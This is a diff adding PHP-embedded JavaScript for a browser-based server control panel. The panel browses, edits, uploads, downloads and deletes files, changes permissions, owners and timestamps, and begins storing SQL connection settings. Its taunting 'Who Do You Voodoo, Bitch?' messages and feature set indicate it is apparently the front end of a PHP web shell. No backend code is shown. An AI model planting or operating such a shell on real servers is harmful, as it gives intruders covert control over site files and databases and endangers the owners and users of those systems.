+ return ((v in fileTypes) ? fileTypes[v] : 'u') + ((p & 0x0100) ? 'r' : '-') + ((p & 0x0080) ? 'w' : '-') + ((p & 0x0040) ? ((p & 0x0800) ? 's' : 'x') : ((p & 0x0800) ? 'S' : '-')) + ((p & 0x0020) ? 'r' : '-') + ((p & 0x0010) ? 'w' : '-') + ((p & 0x0008) ? ((p & 0x0400) ? 's' : 'x') : ((p & 0x0400) ? 'S' : '-')) + ((p & 0x0004) ? 'r' : '-') + ((p & 0x0002) ? 'w' : '-') + ((p & 0x0001) ? ((p & 0x0200) ? 't' : 'x') : ((p & 0x0200) ? 'T' : '-'));
+}
+
+function updFileRow(row, file, ogn) {
+ row.style.visibility = 'hidden';
+ row.cells[3].firstChild.textContent = frmtSize(file[1]);
+ row.cells[4].textContent = utsToStr(file[2]);
+ var elm = row.cells[5].firstChild;
+ elm.className = 'lnkAct prm' + file[3];
+ <?php if(NIX){?>elm.textContent = prmsToStr(file[4]);
+ elm.title = (file[4] | 0).toString(8).slice(-4);
+ elm = row.cells[6];
+ elm.textContent = ogn;
+ elm.title = (file[5] === -1 ? '?' : file[5]) + '/' + (file[6] === -1 ? '?' : file[6]);
+ <?php }else{?>switch(file[3]) {
+  case 1: elm.textContent = 'read';
+  break;
+  case 2: elm.textContent = 'write';
+  break;
+  case 3: elm.textContent = 'read/write';
+  break;
+  default: elm.textContent = 'none';
+  break;
+ }
+ <?php }?>row.style.visibility = 'visible';
+}
+
+function fillFileRow(cells, bpth, file, ogn) {
+ var fpth = bpth + file[0][0],
+  elm = cells[1].firstChild,
+  len = file.length;
+ if (file[1] === null) fpth += DS;
+ cells[0].firstChild.value = fpth;
+ elm.textContent = file[0][1];
+ if (len % 2 === 0) {
+  elm.title = canonPath(file[len - 1], bpth);
+  elm.classList.add('lnk');
+ }
+ if (fmBuffer.indexOf(fpth) > -1) elm.classList.add('mrkd');
+ elm = cells[2].firstChild;
+ elm.title = file[0][0];
+ elm.textContent = file[0][2];
+ cells[3].firstChild.textContent = frmtSize(file[1]);
+ cells[4].textContent = utsToStr(file[2]);
+ elm = cells[5].firstChild;
+ elm.classList.add('prm' + file[3]);
+ <?php if(NIX){?>elm.textContent = prmsToStr(file[4]);
+ elm.title = (file[4] | 0).toString(8).slice(-4);
+ elm = cells[6];
+ elm.textContent = ogn;
+ elm.title = (file[5] === -1 ? '?' : file[5]) + '/' + (file[6] === -1 ? '?' : file[6]);
+ <?php }else{?>switch(file[3]) {
+  case 1: elm.textContent = 'read';
+  break;
+  case 2: elm.textContent = 'write';
+  break;
+  case 3: elm.textContent = 'read/write';
+  break;
+  default: elm.textContent = 'none';
+  break;
+ }
+ <?php }?>
+}
+
+function listFiles(data, ownrs, grps) {
+ var bpth = data.p,
+  files = data.f,
+  tbdy = elmById('tmplFilesTBody').content.firstChild.cloneNode(true);
+ for (var pths = bpth.slice(0, -1).split(DS), cpth = '', i = 0, c = pths.length; i < c; ++i) {
+  cpth += pths[i] + DS;
+  tbdy.rows[0].cells[0].appendChild(newElm('a', {
+   href: '#' + cpth,
+   className: 'spnPth',
+   textContent: pths[i] + DS,
+  }));
+  tbdy.rows[0].cells[0].classList.add('prm' + data.m);
+ }
+ tbdy.rows[1].cells[0].firstChild.value = bpth + '..';
+ files.map(parseName);
+ files.sort(cmprFiles);
+ for (var i = 0, c = files.length; i < c; ++i) {
+  var file = files[i],
+   row = elmTmplFileRow.cloneNode(true);
+  fillFileRow(row.cells, bpth, file<?php if(NIX)echo",ownrs[file[5]]+'/'+grps[file[6]]";?>);
+  tbdy.appendChild(row);
+ }
+ elmTblFiles.appendChild(tbdy);
+}
+
+function listPaths(data) {
+ var stl = elmTblFiles.style;
+ if (stl.display !== 'none') {
+  stl.display = 'none';
+  for (var i = elmTblFiles.tBodies.length - 1; i >= 0; --i) elmTblFiles.removeChild(elmTblFiles.tBodies[i]);
+  elmTblFiles.tHead.rows[0].cells[0].firstChild.checked = false;
+ }
+ if ('p' in data) listFiles(data<?php if(NIX)echo',data.o,data.g';?>);
+ else
+  for (var i = 0, c = data.f.length; i < c; ++i) listFiles(data.f[i] <?php if(NIX)echo',data.o,data.g';?>);
+ stl.display = 'table';
+}
+
+function canonPath(pth, bpth) {
+ if (pth === '') return '';
+ var a = [],
+  s = DS,
+  v = pth.match(new RegExp('^[a-zA-Z0-9]{3,}://'));
+ if (v !== null) {
+  s = '/';
+  v = v[0];
+  var len = v.length;
+  a.push(pth.slice(0, pth[len] === s ? len : v - 1));
+  pth = pth.slice(len);
+ } else if (DS === '/') {
+  if (pth[0] === DS) a.push('');
+ } else {
+  pth = pth.replace('/', DS);
+  if (pth[1] === ':') {
+   a.push(pth.slice(0, 2));
+   pth = pth.slice(2);
+  } else if (pth.slice(0, 2) === DS + DS) {
+   a.push(DS);
+   pth = pth.slice(1);
+  } else if (pth[0] === DS) a.push('');
+ }
+ if (a.length === 0) return canonPath(bpth + pth, bpth);
+ v = pth.split(s);
+ for (var i = 0, l = v.length; i < l; ++i) switch (v[i]) {
+  case '':
+  case '.':
+   break;
+  case '..':
+   if (a.length > 1) a.pop();
+   break;
+  default:
+   a.push(v[i]);
+   break;
+ }
+ return a.length === 1 ? a[0] + s : a.join(s);
+}
+
+function onSrchFiles(div, data) {
+ if ('e' in data) return uiChngMsg(div, data.e, 'Err');
+ if (data.f.length === 0) return uiChngMsg(div, 'Nothing found', 'Inf');
+ listPaths(data);
+ uiDelMsg(div);
+}
+
+function srchFiles(e) {
+ e.preventDefault();
+ e.stopPropagation();
+ var frm = elmById('frmSrch'),
+  data = {
+   s: []
+  },
+  pths = frm.elements[0].value.split(DS === '/' ? ':' : ';');
+ for (var i = pths.length - 1; i >= 0; --i) {
+  var pth = canonPath(pths[i], elmPth.placeholder);
+  if (pth !== '') data.s.push(pth);
+ }
+ data.s.sort();
+ fmAjxSnd('Search files', onSrchFiles, data, frm);
+ uiClsModal(frm);
+}
+
+function uiSrchFTypeChngd() {
+ var frm = elmById('frmSrch'),
+  isDir = frm.y.value == 1;
+ for (var i = 0, a = [<?php if(NIX)echo"'u',";?> 'z', 't', 'x', 'v']; i < 5; ++i) frm[a[i]].disabled = isDir;
+}
+
+function uiShwFrmSrch() {
+ var frm = elmById('frmSrch'),
+  elm = frm.elements[0];
+ if (elm.value === '') elm.value = elmPth.placeholder;
+ uiShwModal(frm);
+ return false;
+}
+
+function updFrmFile(frm, file, cntnt, chrst) {
+ if (file[1] !== null) {
+  var elm = frm.firstChild.firstChild;
+  switch (file[1]) {
+   case 3:
+    elm.textContent = 'Full Access';
+    break;
+   case 2:
+    elm.textContent = 'Writable';
+    break;
+   case 1:
+    elm.textContent = 'Read Only';
+    break;
+   case 0:
+    elm.textContent = 'Who Do You Voodoo, Bitch?';
+    break;
+  }
+  elm.className = 'spnTitle prm' + file[1];
+ }
+ frm.elements[0].value = cntnt;
+ var elm = frm.elements[1];
+ elm.value = file[0];
+ elm.placeholder = file[0];
+ chrst = chrst.toLowerCase();
+ for (var i = frm.c.options.length - 1; i >= 0; --i)
+  if (frm.c.options[i].label.toLowerCase() === chrst) {
+   frm.c.selectedIndex = i;
+   break;
+  }
+}
+
+function tbdyByPath(pth) {
+ for (var i = 0, c = elmTblFiles.tBodies.length; i < c; ++i)
+  if (elmTblFiles.tBodies[i].rows[0].cells[0].textContent === pth) return elmTblFiles.tBodies[i];
+ return null;
+}
+
+function isInsPos(file, cells) {
+ var fF = file[1] !== null,
+  rF = cells[3].firstChild.textContent !== '[ DIR ]';
+ if (fF && rF) {
+  var by = (fmSort[0] < 3 ? fmSort[0] : 1);
+  var fExt = file[0][by],
+   rExt = cells[by].firstChild.textContent;
+  if (fExt !== rExt) return rExt > fExt;
+ } else if (fF) return false;
+ else if (rF) return true;
+ return cells[1].firstChild.textContent > file[0][1];
+}
+
+function updTblFiles(data, ownrs, grps) {
+ var tbdyCnt = elmTblFiles.tBodies.length,
+  bpth = data.p,
+  files = data.f;
+ if (tbdyCnt === 0) return;
+ files.map(parseName);
+ files.sort(cmprFiles);
+ for (var i = 0, c = files.length; i < c; ++i) {
+  var file = files[i],
+   fpth = bpth + file[0][0],
+   lpth = file.length % 2 == 0 ? canonPath(file.slice(-1)[0], bpth) : null,
+   ogn = <?php echo NIX?"ownrs[file[5]]+'/'+grps[file[6]]":"''";?>,
+   isNotUpdtd = true;
+  if (file[1] === null) fpth += DS;
+  for (var t = 0; t < tbdyCnt; ++t) {
+   var tbdy = elmTblFiles.tBodies[t],
+    rows = tbdy.rows,
+    isEqlBsPth = rows[0].cells[0].textContent === bpth;
+   for (var r = 2, n = rows.length; r < n; ++r) {
+    var row = rows[r],
+     cells = row.cells,
+     cfpth = cells[0].firstChild.value,
+     clpth = cells[1].firstChild.title;
+    if (isNotUpdtd && isEqlBsPth) {
+     if (cfpth === fpth) {
+      updFileRow(row, file, ogn);
+      isNotUpdtd = false;
+     } else if (isInsPos(file, cells)) {
+      var tmpl = elmTmplFileRow.cloneNode(true);
+      fillFileRow(tmpl.cells, bpth, file, ogn);
+      tbdy.insertBefore(tmpl, row);
+      isNotUpdtd = false;
+      ++n;
+     }
+    }
+    if (clpth === fpth || cfpth === lpth || lpth === clpth) updFileRow(row, file, ogn);
+   }
+   if (isNotUpdtd && isEqlBsPth) {
+    var tmpl = elmTmplFileRow.cloneNode(true);
+    fillFileRow(tmpl.cells, bpth, file, ogn);
+    tbdy.appendChild(tmpl);
+   }
+  }
+ }
+}
+
+function updTblFile(f) {
+ var pos = f[0].slice(0, -1).lastIndexOf(DS) + 1,
+  bpth = f[0].slice(0, pos),
+  os = {},
+  gs = {};
+ f[0] = f[0].slice(pos);
+ <?php if(NIX){?>os[f[5]] = f[7];
+ gs[f[6]] = f[8];
+ f.splice(7, 2);
+ <?php }?>updTblFiles({
+  p: bpth,
+  f: [f]
+ }, os, gs);
+}
+
+function onSaveFile(div, data, chrst) {
+ if (typeof data !== 'string') return uiChngMsg(div, "Can't s" + div.childNodes[1].nodeValue.slice(1, -1) + data.e, 'Err');
+ var pos = data.lastIndexOf('\x03\x1E'),
+  file;
+ switch (data[pos + 2]) {
+  case '\x06':
+   file = JSON.parse(data.slice(pos + 3));
+   updFrmFile(this, [file[0], file[3]], data.slice(0, pos), chrst);
+   uiDelMsg(div);
+   break;
+  case '\x15':
+   file = JSON.parse(data.slice(pos + 3));
+   uiChngMsg(div, 'File ' + file[0] + " successful saved but can't read now", 'Inf');
+   break;
+  default:
+   uiNetErrMsg(div);
+   return false;
+   break;
+ }
+ updTblFile(file);
+}
+
+function saveFile(e) {
+ e.preventDefault();
+ e.stopPropagation();
+ var frm = e.target,
+  pth = canonPath(frm.elements[1].value, elmPth.placeholder);
+ fmAjxSnd('Save file as ' + pth, onSaveFile, {
+  w: pth
+ }, frm, frm.c.textValue);
+}
+
+function onRldFile(div, data, chrst) {
+ if (typeof data !== 'string') return uiChngMsg(div, "Can't read file " + div.childNodes[1].nodeValue.slice(5, -2) + data.e, 'Err');
+ var pos = data.lastIndexOf('\x03\x1E'),
+  file;
+ switch (data[pos + 2]) {
+  case '\x06':
+   file = JSON.parse(data.slice(pos + 3));
+   updFrmFile(this, file, data.slice(0, pos), chrst);
+   uiDelMsg(div);
+   break;
+  case '\x15':
+   file = JSON.parse(data.slice(pos + 3));
+   uiChngMsg(div, "Can't read file " + file[0], 'Inf');
+   break;
+  default:
+   uiNetErrMsg(div);
+   return false;
+   break;
+ }
+}
+
+function rldFile(e) {
+ e.preventDefault();
+ e.stopPropagation();
+ var frm = e.target.parentNode.parentNode,
+  pth = frm.elements[1].placeholder;
+ frm.t.value = '';
+ if (frm.firstChild.firstChild.textContent !== 'New File') fmAjxSnd('Reload file ' + pth, onRldFile, {
+  g: pth
+ }, frm);
+}
+
+function rldFileAs(e) {
+ if (e.target.parentNode.parentNode.elements[1].placeholder !== '' && confirm('Do you want to reload this file with selected charset?')) rldFile(e);
+}
+
+function uiShwFrmFile(file, cntnt, chrst) {
+ var frm = elmById('tmplFrmFile').content.firstChild.cloneNode(true);
+ updFrmFile(frm, file, cntnt, chrst);
+ elmById('divWndws').appendChild(frm);
+ uiShwModal(frm);
+}
+
+function onGoTo(div, data, chrst) {
+ if (typeof data === 'string') {
+  var pos = data.lastIndexOf('\x03\x1E');
+  switch (data[pos + 2]) {
+   case '\x06':
+    uiShwFrmFile(JSON.parse(data.slice(pos + 3)), data.slice(0, pos), chrst);
+    uiDelMsg(div);
+    break;
+   case '\x15':
+    uiChngMsg(div, "Can't open " + data.slice(pos + 3), 'Err');
+    break;
+   default:
+    uiNetErrMsg(div);
+    break;
+  }
+ } else {
+  if (data.f.length === 0 && (data.m === 0 || data.m === 2)) uiChngMsg(div, "Can't read dir " + data.p, 'Err');
+  else {
+   elmPth.value = data.p;
+   elmPth.placeholder = data.p;
+   listPaths(data);
+   uiDelMsg(div);
+  }
+ }
+}
+
+function goTo(pth) {
+ if (pth !== '' && pth !== '~') pth = canonPath(pth, elmPth.placeholder);
+ fmAjxSnd('Go ' + ((pth === '' || pth === '~') ? 'home' : 'to ' + pth), onGoTo, {
+  g: pth
+ });
+ return false;
+}
+
+function uiTgglSubMenu(e) {
+ var div = e.currentTarget.nextSibling,
+  style = div.style;
+ if (style.display === 'block') style.display = 'none';
+ else {
+  style.display = 'block';
+  div.firstChild.focus();
+ }
+}
+
+function menuButtonBlur(e) {
+ setTimeout(uiMenuButtonBlur, 10, e.nextSibling);
+}
+
+function menuItemBlur(e) {
+ setTimeout(uiMenuItemBlur, 10, e.parentNode);
+}
+
+function uiMenuButtonBlur(menuDiv) {
+ var actvPrnt = document.activeElement.parentNode;
+ if (actvPrnt !== menuDiv) menuDiv.style.display = 'none';
+}
+
+function uiMenuItemBlur(menuDiv) {
+ var actvPrnt = document.activeElement.parentNode;
+ if (actvPrnt !== menuDiv && actvPrnt !== menuDiv.parentNode) menuDiv.style.display = 'none';
+}
+
+function uiDstrModal(wndw) {
+ elmById('divWndws').removeChild(wndw);
+ return false;
+}
+
+function updBufferState() {
+ var elm = elmById('btnBufferMenu'),
+  isEmpty = fmBuffer.length === 0;
+ if (elm.disabled !== isEmpty) elm.disabled = isEmpty;
+ if (isEmpty) {
+  elm = elmById('frmBuffer');
+  if (elm.style.visibility === 'visible') {
+   uiClsModal(elm);
+   elm = elmById('tblBuffer');
+   elm.removeChild(elm.tBodies[0]);
+  }
+ }
+}
+
+function rmFiles(data) {
+ var bpth = data.p,
+  files = data.f,
+  flsTbds = elmTblFiles.tBodies,
+  flsTbdy = tbdyByPath(bpth),
+  bfrTbdy = elmById('frmBuffer').style.visibility === 'visible' ? elmById('tblBuffer').tBodies[0] : null;
+ for (var i = files.length - 1; i >= 0; --i) {
+  var fpth = files[i];
+  if (flsTbdy)
+   for (var j = flsTbdy.rows.length - 1; j > 1; --j)
+    if (flsTbdy.rows[j].cells[2].firstChild.title === fpth) {
+     flsTbdy.removeChild(flsTbdy.rows[j]);
+     break;
+    } fpth = bpth + fpth;
+  var n = fmBuffer.indexOf(fpth);
+  if (n > -1) {
+   fmBuffer.splice(n, 1);
+   if (bfrTbdy) bfrTbdy.removeChild(bfrTbdy.rows[n]);
+  }
+  fpth += DS;
+  var len = fpth.length;
+  for (n = flsTbds.length - 1; n >= 0; --n)
+   if (flsTbds[n].rows[0].cells[0].textContent.slice(0, len) === fpth) elmTblFiles.removeChild(flsTbds[n]);
+  for (n = fmBuffer.length - 1; n >= 0; --n)
+   if (fmBuffer[n].slice(0, len) === fpth) {
+    fmBuffer.splice(n, 1);
+    if (bfrTbdy) bfrTbdy.removeChild(bfrTbdy.rows[n]);
+   }
+ }
+}
+
+function onChngPrps(div, data) {
+ if ('r' in data) {
+  for (var i = 0, c = data.r.length; i < c; ++i) rmFiles(data.r[i]);
+  updBufferState();
+ }
+ if ('c' in data)
+  for (var i = 0, c = data.c.length; i < c; ++i) updTblFiles(data.c[i] <?php if(NIX)echo',data.o,data.g';?>);
+ if ('e' in data) uiChngMsg(div, "Can't change" + (data.e.length === 1 ? ' ' + data.e[0] : ':\n' + data.e.join('\n')), 'Err');
+ else uiDelMsg(div);
+}
+
+function chngPrps(e) {
+ e.preventDefault();
+ e.stopPropagation();
+ var frm = e.target,
+  data = {
+   h: []
+  },
+  flds = {
+   p: 'path',
+   t: 'modified time'
+   <?php if(NIX)echo",e:'permissions',o:'owner',r:'group'";?>
+  },
+  chngd = [];
+ for (var field in flds)
+  if (frm[field].value !== '' && frm[field].value !== frm[field].placeholder) {
+   data[field] = frm[field].value;
+   chngd.push(flds[field]);
+  } if (chngd.length > 0) {
+  if ('p' in data) data.p = canonPath(data.p, elmPth.placeholder);
+  var elm = frm['h[]'],
+   cnt = elm.length ? elm.length : 1;
+  if (cnt > 1)
+   for (var i = 0; i < cnt; ++i) data.h.push(elm[i].value);
+  else data.h.push(elm.value);
+  fmAjxSnd('Change ' + chngd.join(', ') + ' for ' + (cnt > 1 ? 'selected files (' + cnt + ')' : elm.value), onChngPrps, data);
+ }
+ uiDstrModal(frm);
+}
+
+function setErlDate(e) {
+ e.preventDefault();
+ e.stopPropagation();
+ var elm = e.target.parentNode.lastChild,
+  erlDate = elm.value;
+ for (var i = elmTblFiles.tBodies.length - 1; i >= 0; --i) {
+  var rows = elmTblFiles.tBodies[i].rows;
+  for (var j = rows.length - 1; j > 1; --j)
+   if (rows[j].cells[4].textContent < erlDate || erlDate === '') erlDate = rows[j].cells[4].textContent;
+ }
+ if (erlDate !== '' && erlDate < elm.value) elm.value = erlDate;
+}
+
+function uiShwFrmPrps(data, files) {
+ var frm = elmById('tmplFrmPrps').content.firstChild.cloneNode(true);
+ for (var i = 0, c = files.length; i < c; ++i) frm.appendChild(newElm('input', {
+  type: 'hidden',
+  name: 'h[]',
+  value: files[i]
+ }));
+ frm.p.value = data[0];
+ frm.p.placeholder = data[0];
+ frm.t.value = data[1];
+ frm.t.placeholder = data[1];
+ <?php if(NIX){?>frm.e.value = data[2];
+ frm.e.placeholder = data[2];
+ frm.o.value = data[3];
+ frm.o.placeholder = data[3];
+ frm.r.value = data[4];
+ frm.r.placeholder = data[4];
+ <?php }?>elmById('divWndws').appendChild(frm);
+ uiShwModal(frm);
+}
+
+function onGetPrps(div, data) {
+ if (data[4] === 0) return uiChngMsg(div, "Can't get properties of " + data[0], 'Err');
+ uiShwFrmPrps([data[0], utsToStr(data[2]), (data[4] | 0).toString(8).slice(-4), data[5] === -1 ? '?' : data[5], data[6] === -1 ? '?' : data[6]], [data[0]]);
+ uiDelMsg(div);
+}
+
+function getPrps(fpth) {
+ fmAjxSnd('Get properties of ' + fpth, onGetPrps, {
+  i: fpth
+ });
+}
+
+function onDwnFiles(div, data) {
+ uiChngMsg(div, "Can't d" + div.childNodes[1].nodeValue.slice(1, -2), 'Err');
+}
+
+function dwnFiles(files) {
+ var cnt = files.length;
+ if (cnt > 0) fmAjxSnd('Download ' + (cnt > 1 ? 'selected files (' + cnt + ')' : files[0]), onDwnFiles, {
+  d: cnt > 1 ? files : files[0]
+ });
+}
+
+function onDelFiles(div, data) {
+ if ('r' in data) {
+  for (var i = data.r.length - 1; i >= 0; --i) rmFiles(data.r[i]);
+  updBufferState();
+ }
+ if ('e' in data) uiChngMsg(div, "Can't delete " + (data.e.length === 1 ? data.e[0] : ':\n' + data.e.join('\n')), 'Err');
+ else uiDelMsg(div);
+}
+
+function delFiles(files) {
+ var cnt = files.length,
+  msg = 'Delete ' + (cnt > 1 ? 'selected files (' + cnt + ')' : files[0]);
+ if (cnt > 0 && confirm(msg + ' ?')) fmAjxSnd(msg, onDelFiles, {
+  u: files
+ });
+}
+
+function onFastActClick(e) {
+ var trgt = e.target;
+ if (trgt.tagName !== 'A') return;
+ e.preventDefault();
+ e.stopPropagation();
+ trgt.blur();
+ var fpth = canonPath(elmPth.value, elmPth.placeholder);
+ if (fpth === '') return;
+ switch (trgt.textContent) {
+  case 'Properties':
+   getPrps(fpth);
+   break;
+  case 'Download':
+   dwnFiles([fpth]);
+   break;
+  case 'Delete':
+   delFiles([fpth]);
+   break;
+ }
+}
+
+function onUplFiles(div, data) {
+ if ('p' in data) updTblFiles(data<?php if(NIX)echo',data.o,data.g';?>);
+ if ('e' in data) {
+  var errs = ["can't move file to current dir", 'file size exceeds the upload_max_filesize directive', 'file size exceeds the max_file_size property', 'file only partially uploaded', 'file not uploaded', 'Who Do You Voodoo, Bitch?', 'missing a temporary folder', 'failed to write to disk', 'some PHP extension stopped the upload'],
+   cnt = data.e.length,
+   sep = cnt === 1 ? ' ' : '\n',
+   msg = "Can't save uploaded file";
+  if (cnt > 1) msg += 's:';
+  for (var i = 0; i < cnt; ++i) msg += sep + data.e[i].slice(1) + ' (' + errs[data.e[i].slice(0, 1)] + ')';
+  uiChngMsg(div, msg, 'Err');
+ } else uiDelMsg(div);
+}
+
+function uplFiles() {
+ var inp = elmById('inpUpl'),
+  fls = inp.files,
+  len = fls.length;
+ fmAjxSnd('Upload ' + (len > 1 ? len + ' files' : fls[0].name), onUplFiles, {
+  p: elmPth.placeholder
+ }, inp.form);
+}
+
+function onMkFile(div, data) {
+ if ('e' in data) return uiChngMsg(div, "Can't c" + div.childNodes[1].nodeValue.slice(1, -1) + data.e, 'Err');
+ updTblFile(data);
+ uiDelMsg(div);
+}
+
+function mkLnk(e) {
+ e.preventDefault();
+ e.stopPropagation();
+ var frm = elmById('frmLnk'),
+  lnk = canonPath(frm.elements[1].value, elmPth.placeholder);
+ fmAjxSnd('Create ' + frm.t.textValue.toLowerCase() + ' link ' + lnk + ' to ' + frm.p.value, onMkFile, {
+  l: lnk
+ }, frm);
+ uiClsModal(frm);
+}
+
+function uiShwFrmLnk(p) {
+ var frm = elmById('frmLnk');
+ frm.p.value = p;
+ frm.elements[1].value = p;
+ frm.t.selectedIndex = 0;
+ uiShwModal(frm);
+}
+
+function mkDir(bp) {
+ var fp = prompt('Create Directory', bp);
+ if (fp !== null) {
+  fp = canonPath(fp, bp);
+  fmAjxSnd('Create directory ' + fp, onMkFile, {
+   m: fp
+  });
+ }
+}
+
+function onCrtMenuClick(e) {
+ var trgt = e.target;
+ if (trgt.tagName !== 'A') return;
+ e.preventDefault();
+ e.stopPropagation();
+ trgt.blur();
+ var bpth = elmPth.placeholder;
+ switch (trgt.textContent) {
+  case 'File':
+   uiShwFrmFile([bpth, null], '', elmById('fmCSSend').value);
+   break;
+  case 'Link':
+   uiShwFrmLnk(bpth);
+   break;
+  case 'Directory':
+   mkDir(bpth);
+   break;
+ }
+}
+
+function uiUnmrkTblFiles(files) {
+ var as = elmTblFiles.getElementsByClassName('mrkd');
+ for (var i = as.length - 1; i >= 0; --i) {
+  var n = files.indexOf(as[i].parentNode.parentNode.cells[0].firstChild.value);
+  if (n > -1) {
+   as[i].classList.remove('mrkd');
+   files.splice(n, 1);
+   if (files.length === 0) break;
+  }
+ }
+}
+
+function unmarkFiles() {
+ var tbdy = elmById('tblBuffer').tBodies[0],
+  inps = elmById('frmBuffer')['f[]'],
+  files = [];
+ if (!inps.length) inps = [inps];
+ for (var i = inps.length - 1; i >= 0; --i)
+  if (inps[i].checked) {
+   files.push(fmBuffer.splice(i, 1)[0]);
+   tbdy.removeChild(inps[i].parentNode.parentNode);
+  } if (files.length > 0) {
+  uiUnmrkTblFiles(files);
+  updBufferState();
+ }
+}
+
+function onTblBufferClick(e) {
+ var trgt = e.target;
+ if (trgt.tagName !== 'A') return;
+ e.preventDefault();
+ e.stopPropagation();
+ var row = trgt.parentNode.parentNode,
+  fpth = row.cells[0].firstChild.value;
+ switch (trgt.parentNode.cellIndex) {
+  case 1:
+   goTo(fpth);
+   break;
+  case 2:
+   fmBuffer.splice(row.rowIndex - 1, 1);
+   row.parentNode.removeChild(row);
+   uiUnmrkTblFiles([fpth]);
+   updBufferState();
+   break;
+ }
+}
+
+function uiShwFrmBuffer() {
+ var frm = elmById('frmBuffer');
+ if (frm.style.visibility === 'visible') return;
+ var tbl = elmById('tblBuffer'),
+  tbdy = document.createElement('tbody'),
+  elmTmplBufferRow = elmById('tmplBufferRow').content.firstChild;
+ frm.elements[0].checked = false;
+ if (tbl.tBodies.length > 0) tbl.removeChild(tbl.tBodies[0]);
+ fmBuffer.sort();
+ for (var i = 0, c = fmBuffer.length; i < c; ++i) {
+  var row = elmTmplBufferRow.cloneNode(true);
+  row.cells[0].firstChild.value = fmBuffer[i];
+  row.cells[1].firstChild.textContent = fmBuffer[i];
+  tbdy.appendChild(row);
+ }
+ tbl.appendChild(tbdy);
+ uiShwModal(frm);
+}
+
+function getName(f) {
+ return f[0];
+}
+
+function onFlshBuffer(div, data) {
+ var files = ('c' in data) ? data.c : [];
+ if ('m' in data)
+  for (var i = data.m.length - 1; i >= 0; --i) {
+   rmFiles({
+    p: data.m[i].p,
+    f: data.m[i].f.map(getName)
+   });
+   files = files.concat(data.m[i].f);
+  }
+ updTblFiles({
+   p: data.p,
+   f: files
+  }
+  <?php if(NIX)echo',data.o,data.g';?>);
+ if ('e' in data) {
+  var msg = div.childNodes[1].nodeValue;
+  uiChngMsg(div, "Can't " + msg.slice(0, 10).toLowerCase() + msg.slice(26, -1) + ":\n" + data.e.join("\n"), 'Err');
+ } else uiDelMsg(div);
+}
+
+function flushBuffer(act) {
+ var bpth = elmPth.placeholder,
+  data = {
+   f: bpth
+  };
+ data[act === 'Copy' ? 'p' : 'v'] = fmBuffer;
+ fmAjxSnd(act + ' files from the buffer to ' + bpth, onFlshBuffer, data);
+}
+
+function clnBuffer() {
+ var as = elmTblFiles.getElementsByClassName('mrkd');
+ for (var i = as.length - 1; i >= 0; --i) as[i].classList.remove('mrkd');
+ fmBuffer = [];
+ updBufferState();
+}
+
+function onBufferMenuClick(e) {
+ var trgt = e.target;
+ if (trgt.tagName !== 'A') return;
+ e.preventDefault();
+ e.stopPropagation();
+ trgt.blur();
+ fmBuffer.sort();
+ switch (trgt.textContent) {
+  case 'Show files':
+   uiShwFrmBuffer();
+   break;
+  case 'Copy here':
+  case 'Move here':
+   flushBuffer(trgt.textContent.slice(0, 4));
+   clnBuffer();
+   break;
+  case 'Download':
+   dwnFiles(fmBuffer);
+   clnBuffer();
+   break;
+  case 'Clear':
+   clnBuffer();
+   break;
+ }
+}
+
+function markFiles(files) {
+ var bfrTbdy = elmById('frmBuffer').style.visibility === 'visible' ? elmById('tblBuffer').tBodies[0] : null,
+  elmTmplBufferRow = elmById('tmplBufferRow').content.firstChild;
+ for (var i = 0, c = files.length; i < c; ++i) {
+  var file = files[i],
+   n = fmBuffer.indexOf(file);
+  if (n === -1) {
+   fmBuffer.push(file);
+   if (bfrTbdy) {
+    var row = elmTmplBufferRow.cloneNode(true);
+    row.cells[0].firstChild.value = file;
+    row.cells[1].firstChild.textContent = file;
+    bfrTbdy.appendChild(row);
+   }
+  } else {
+   fmBuffer.splice(n, 1);
+   if (bfrTbdy) bfrTbdy.removeChild(bfrTbdy.rows[n]);
+  }
+ }
+ updBufferState();
+}
+
+function getSlctdFiles() {
+ var inps = elmById('frmFiles')['f[]'], chckd = [];
+ if(!inps.hasOwnProperty('1')) inps = [inps];
+ 
+ if (inps) {
+  if (inps.length > 0) {
+   for (var i = 0, c = inps.length; i < c; ++i)
+    if (inps[i].checked) chckd.push(inps[i].value);
+  } else chckd.push(inps);
+ }
+ return chckd;
+}
+
+function prpsSlctdFiles() {
+ var files = getSlctdFiles();
+ if (files.length > 0) uiShwFrmPrps(['', '', '', '', ''], files)
+}
+
+function markSlctdFiles() {
+ var inps = elmById('frmFiles')['f[]'],
+  files = [];
+ if (!inps) return;
+ if (!inps.length) inps = [inps];
+ for (var i = 0, c = inps.length; i < c; ++i)
+  if (inps[i].checked) {
+   inps[i].parentNode.parentNode.cells[1].firstChild.classList.toggle('mrkd');
+   files.push(inps[i].value);
+  } markFiles(files);
+}
+
+function onTblFilesClick(e) {
+ var trgt = e.target;
+ if (trgt.tagName !== 'A') return;
+ e.preventDefault();
+ e.stopPropagation();
+ if (trgt.className == 'spnPth') goTo(trgt.hash.slice(1));
+ else {
+  var cell = trgt.parentNode,
+   row = cell.parentNode,
+   fpth = row.cells[0].firstChild.value;
+  switch (cell.cellIndex) {
+   case 1:
+    goTo(fpth);
+    break;
+   case 2:
+    var elmTxtClpbrd = elmById('txtClpbrd');
+    elmTxtClpbrd.value = trgt.title;
+    elmTxtClpbrd.select();
+    document.execCommand('copy');
+    elmTxtClpbrd.value = '';
+    trgt.focus();
+    break;
+   case 3:
+    dwnFiles([fpth]);
+    break;
+   case 5:
+    <?php if(NIX)echo"var og=row.cells[6].title.split('/');";?>uiShwFrmPrps([fpth, row.cells[4].textContent<?php if(NIX)echo',row.cells[5].firstChild.title,og[0],og[1]';?>], [fpth]);
+    break;
+   default:
+    if (trgt.textContent === 'Mrk') {
+     row.cells[1].firstChild.classList.toggle('mrkd');
+     markFiles([fpth]);
+    } else if (trgt.textContent === 'Del') delFiles([fpth]);
+    break;
+  }
+ }
+}
+
+function sqlRestoreState() {
+ var val = sessionStorage.getItem('sqlCnnct');
+ if (val !== null) {
+  var frm = elmById('frmCnnct');
+  val = JSON.parse(val);
+  for (var key in val) frm[key].value = val[key];
+ }
+ strgRstrChck('sqlCntRw', 'cbCR');
+ strgRstrVal('sqlRPP', elmById('frmPg').r);
+ strgRstrVal('sqlSendAs', 'sqlCSSend');
+ strgRstrVal('sqlLoadAs', 'sqlCSLoad');
+}
+
+function sqlSaveState() {
+ var elms = elmById('frmCnnct').elements,
+  val = {};
+ for (var i = elms.length - 1; i >= 0; --i)
+  if (elms[i].name !== '') val[elms[i].name] = elms[i].value;
+ strgSaveStr('sqlCnnct', JSON.stringify(val));
+ strgSaveBool('sqlCntRw', 'cbCR');
